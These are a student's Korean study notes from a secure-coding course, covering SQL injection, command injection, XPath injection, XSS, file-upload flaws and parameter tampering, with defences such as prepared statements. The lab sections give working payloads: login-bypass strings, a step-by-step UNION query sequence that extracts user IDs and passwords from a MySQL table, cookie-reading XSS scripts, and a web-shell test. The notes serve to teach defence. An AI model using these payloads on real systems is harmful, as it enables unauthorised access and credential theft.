# SecureCoding-Study
시큐어코딩 수업
실습, 이론
C:\SecureCoding
# 11주차
# SQL 삽입공격
### -이론-
동적 쿼리 SQL문 사용할때 
외부 입력값에 따라 쿼리문에 구조가 바뀌는 취약점을 이용
-피해유형
1. DB 정보 열람 및 추가 , 삭제 가능
2. 프로시저를 통해 운영체제 명령어 수행
3. 웹 애플리케이션을 조정해 다른 시스템을 공격
4. 불법 로그인
- 공격의 유형
1. Form Based SQL 삽입
 웹사이트페이지 Form에서 로그인할때 칸에
  sql문으로 사용할수 있는 특수문자 이용히여 공격
2. UNION SQL 삽임
 웹애플리케이션이 조회결과를 리스트로 출력하는 화면을 가진경우
- 방어
1. 정적쿼리를 사용 
PreparedStatement 을 사용 정적쿼리 방식으로 미리만들어진 쿼리문을
활용 외부입력값은 set메소드를 입력 -> 쿼리 구조가 변조 방지
2. 동적쿼리일때
특수문자 및 SQL 명령문으로 사용되는 키워드 철저히 제거

### -실습-
실습환경: 1. 웹 애플리케이션 서버는 사용자의 입력을 받아
            동적 쿼리에 사용하고 있음
         2. 화이트리스트 기반의 필터링을 전혀 사용하지 않음
         ---> sql삽입공격에 매우 취약함
         ID :test PW:test 
 
1. 비정상적인 입력 값으로 인증 우회가능성 확인
1) ID :'or'a-'='a  PW :  ID :'or'a-'='a
 --> HTTP Status 500 Error 발생
 too many results 구문이 있다 
 -> 정상적인 상황보다 많은정보를 요청하여 서버가표시할수없음
 항상참값이 봔환되어 모든테이블의 정보를 확인하라는 명령으로 변경되었다.
 
2) ID:admin'#  PW:aaa 
 --> 관리자 모드로 로그인
 
 2. UNION SQL 삽입공격 실습
  :UNION SQL 삽입 취약점을 이용하여 단계적으로 보안 자산의 정보추출
   공격자가 원하는 중요 정보 자산을 탈취하는 공격 과정
  시큐어코딩테스트-> SQL 인젝션 -> MYSQL 인젝션 -> ID:admin
 
 1) ID:admin'union select 1,2,3,4# --> DB에서 사용하는 컬럼의개수 확인 ->에러
 2) 순차적으로 컬럼을 높여감 ID:admin'union select 1,2,3,4,5# -> 에러
 3) ID:admin'union select 1,2,3,4,5,6# --> 정보가 나타남
   -> 따라서 DB컬럼개수:6개 -> 향후 공격에서 컬럼6개로 맞춰주고,1~4번 컬럼에
   악성 쿼리문을 삽입하면 정보 유출가능성이 있다.
 4) DBMS버전 확인 ID:admin'union select version(),2,3,4,5,6#
  -> Union select와 버전 키워드를 사용함으로써 해당 DBMS의 버전정보를 얻어올수있음
 5) 공격대상 DM목록 확인 
  -> ID:admin'union select schema_name,2,3,4,5,6 from     
     information_schema.schemata#
 6) 특정 DB선정후 ,테이블 목록확인
  -> ID:admin'union select group_concat(table_name),2,3,4,5,6 from
     information_schema.tables where table_shema=database()#
 7) 테이블의 컬럼 명 확인
   -> ID:admin'union select group_concat(column_name),2,3,4,5,6 from
     information_schema.columns where table_name='board_member'#
 8) 컬럼 데이터 추출
   -> ID:admin'union select idx,userid,userpw,username,5,6
      from board_member#
 
 학생활동 --> 기말대체 과제일수도있다.
 1. SQL삽입공격의실제사례를분석해본다
 2. SQL 삽입공격의유형을조사해본다
 3. 보안정보공유체계(CVE, CWE, NVD)에서SQL 삽입공격을찾아본다.
 4. SQL 삽입공격유형별방어대책에대해조사해본다  --> 디테일하게 기말대체는 보지않는다.
https://cwe.mitre.org/data/definitions/1350.html
https://cwe.mitre.org/data/definitions/89.html
https://www.cvedetails.com/cve/CVE-2021-27928/
https://mariadb.com/kb/en/security/
들어가서 cwe list -> latest version -> 네랴서 cwe top25
아니면 구글에 ex) sql-injection cve -> detail 들어가기 
         

# 12주차
# 운영체제 명령어 삽입
개요 : 적절한 검증 절차를 거치지 않은 웹페이지나 웹서버에서 사용자가 입력값이
      명령어의 일부 또는 전부로 구성되어 실행되는 경우 의도하지 않은 시스템
      명령어가 실행되어 부적절하게 권한이 변경되거나 시스템 동작에 악영향을 미친다.
      
<공격>
 프록시 파로스 키고  request 잡고 시큐어코딩테스트 -> 명령어 인젝션
 data=dir 을 받으면 웹서버에서는 자신의 디렉토리정보를 윈도우 커맨드로 날린다음
 화면에 나타나졋다. 이것을 예측해 data=notepad 로 변경하면 메모장이 켜진다.
 
 <방어>
 data=type 을 바로 받아서 커맨드를 바로 사용하는 것이 아니라
 index나 정수 값을 받아서 그것에 매칭되는 커맨드를 배열에 꺼내 사용하면
 약속된 커맨드만 서버쪽으로 전달할수있다.
 
 실습: openeg->src-> testcontroller.java
   -> #Command 인젝션으로 가서 -> 코드 수정
   
   
# XPath 삽입
XML 문서에 저장된 데이터를 애플리케이션에서 검색하거나
추출하기 위해 사용하는 표현방식
ex) product id=3 인 제품의 price를 추출하라
 -> /catalog/product [@id=3]/price
Xpath 삽입 취약점 발생원인 : 사용자가 입력을 받아, 입력값에 대한 검증없이,
동적으로 XPath 쿼리를 생성하면 공격자가 해당 쿼리 문의 의미를 수정할 수 있음.

XPath 인젝션

# XSS (크로스 사이트 스크립팅) 공격
### -이론-
취약점 : 외부 입력값이 충분한 검증없이
        동적으로 생성되는 응답 페이지에 사용되는 경우

공격유형
1. Reflective XSS  : 공격자가 악성 스크립트가 포합된 url을 클라이언트에 노출
                     클릭유도 -> 악성행위 수행
2. Stored XSS : 악성 스크립트를 데이터베이스에 저장
                모든 사용자들이 해당 스크립트 실행 -> 악성행위수행

1.Reflective XSS
  반사공격 -> 공격 대상 브라우저가 신뢰하고 있는 웹서버 이용
  
2.Sored XSS
  대다수의 개발자가 데이터베이스를 읽어서 할때는 XSS 취약점
  검증을 철저하게 수행하지않는 특징
  
XSS 취약점 발생원인
: JSP, Servlet 코드에서 외부 사용자의 입력값& DB검색한 결과값을 검증하지않고
 응답의 일부로 사용하기 때문
 
XSS 공격차단
1. 입출력값에 필터링 적용
   http헤더,쿠키,쿼리문자열,폼필드,히든필드 등 정규식을 사용하여 검증
2. 오픈소스 라이브러리 활용 XSS Filter
  인코딩규칙 까지 충분히 감안해야해서 필터를 직접 만들기는 어려움
  -> 잘 검증된 필터 적용

### -실습-
Reflective XSS         
1. 경고창을 띄울 수 있는 스크립트 입력 값으로 사용하기
 <script>alert("xss");</script>
2. url 인코딩 값 이용하여 경고창 띄우기
3. 경고창 팝업 이용하여 쿠키 값 확인하기 
   <script>alert(document.cookie)</script>-> 확인할수없음
   -> 공격실패가 아닌, 보안옵션이 클라이언트pc에 설정되어있는것
   -> 보안옵션해제 -> F12, Application, cookie, locathost, httponly해지
   -> 다시공격하면 세션아이디확인 , httponly(반사공격을 막아내는 보안옵션)


# 13주차
pwnsshell 다운
# 파일 업로드/ 다운로드 취약점

-파일 업로드 기능시 취약점 발생원인
 1. 파일의 타입을 제한하지 않는경우
 2. 파일의 크기ㄷ나 갯수를 제한하지 않는경우
 3. 파일을 외부에서 직접적으로 접근가능한 경우
 4. 파일의 이름과 저장된 파일의 이름이 동일하여 공격자가 파일에 대한 
    인식이 가능한 경우
 5. 파일이 실행권한이 있는 경우
 
 -파일 다운로드 기능시 취약점 발생원인
 1. 파일에 대한 접근권한이 없는 사용자가 직접적인 경로를 이용하여 파일을 다운로드       할수 있는 경우
 2. 악성코드에 감염된 파일을 다운로드 허용하는 경우


# 실습-
업로드
 1. 업로드 경로 확인
 2. 업로드 파일명과 같은 명으로 파일을 업로드후 직접 접근되는지 
 3. 웹쉘 테스트
# 업로드파일 방어
 1. 업로드되는 파일의 타입을 제한
  file.getContentType().contains("image")){
  //업로드 파일명
  String fileName=file.getOriginalFilename();
  if (fileName.toLowerCase().endWith(".jpg")){

 2. 저장경로를 외부에서 파일 직접접근이 불가능하게 
  String uploadPath=session.getServletContext().getRealPath("/")
       +"WEB-INF/files/";
 
 3. 업로드 파일의 크기를 제한
  if(file!=null&&"".equals(file.getOriginalFilename())
    &&file.getSize()<1024000 &&
 
 한후 
 업로드 파일 다시확인 , 저장위치확인 및 파일을 얻어올수 있도록
 @RequestMapping(value="/write.do",method=RequestMethod.POST)
 
 WEB=INF 보드부분 뷰파일 찾은후
 <a href="get_image.do?idx=${board.idx}"
    
# 파라미터 조작
-파라미터 조작과 잘못된 접근제어의 정의/
관리자 페이지와 같이 인가된 특정사용자만 사용가능한 페이지에 대해
올바른 접근권한 레벨을 정의하고 점검하는 프로세스가 제대로 적용되어있지 않은경우
-> 공격자는 특정 파라미터를 조작해 목적을 달성한다.

 
 
 
 
 
 
 
 
 
 
 
 
 
         
         
         
         
         
         
         
         
